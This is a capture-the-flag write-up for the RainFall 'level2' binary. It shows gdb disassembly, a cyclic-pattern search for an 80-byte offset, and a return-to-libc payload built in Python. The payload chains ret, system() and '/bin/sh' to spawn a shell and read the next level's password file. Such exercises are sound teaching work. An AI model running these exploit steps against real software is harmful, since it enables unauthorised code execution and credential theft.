As seen in the disassembled code, the program uses the gets() function to take user input :

```
gdb ./level2
disass p
```

but this time we also see that check ensures that the return address is not overwritten with an address on the stack:

```
0x80484fb <p+39>:	and    eax,0xb0000000
0x8048500 <p+44>:	cmp    eax,0xb0000000
```


We will bypass this check using a return-to-libc exploit. First, we find the address of the system function in libc:
```
ldd ./level2 | grep libc
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
```
Next, we find the address of the ret instruction:
```
0x804853e <p+106>:	ret
```
We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
```
level2@RainFall:~$ gdb ./level2 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

```
We find that the buffer size is 80

Next, we need to construct the payload to exploit the vulnerability using the following format:
```
buffer + return address + system function address + fake return address + "/bin/sh" address from libc
```
```
$ python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "4242" + "\x35\xf9\xff\xbf"' > /tmp/payload2
$ cat /tmp/payload2 - | ./level2
$ cat /home/user/level3/.pass
```
